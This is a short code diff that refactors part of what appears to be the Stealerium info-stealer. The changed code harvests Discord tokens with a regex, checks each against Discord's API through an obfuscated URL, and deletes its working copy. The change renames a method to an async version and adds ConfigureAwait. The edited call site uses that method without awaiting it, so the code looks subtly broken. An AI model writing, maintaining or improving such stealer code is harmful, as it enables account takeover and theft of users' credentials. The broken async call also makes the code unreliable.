@@ -74,7 +74,7 @@ namespace Stealerium.Target.Messengers
         }
 
         // Check token
-        private static async Task<string> TokenState(string token)
+        private static async Task<string> TokenStateAsync(string token)
         {
             try
             {
@@ -85,7 +85,7 @@ namespace Stealerium.Target.Messengers
                         StringsCrypt.Decrypt(new byte[]
                         {
                             241, 158, 131, 195, 114, 143, 24 // https://discordapp.com/api/v6/users/@me
-                        }));
+                        })).ConfigureAwait(false);
                     return result.Contains("Unauthorized") ? "Token is invalid" : "Token is valid";
                 }
             }
@@ -120,7 +120,7 @@ namespace Stealerium.Target.Messengers
                         select TokenRegex.Match(text)
                         into match
                         where match.Success
-                        select $"{match.Value} - {TokenState(match.Value)}");
+                        select $"{match.Value} - {TokenStateAsync(match.Value)}");
 
                     Filemanager.RecursiveDelete(cpdirectory);
                 }
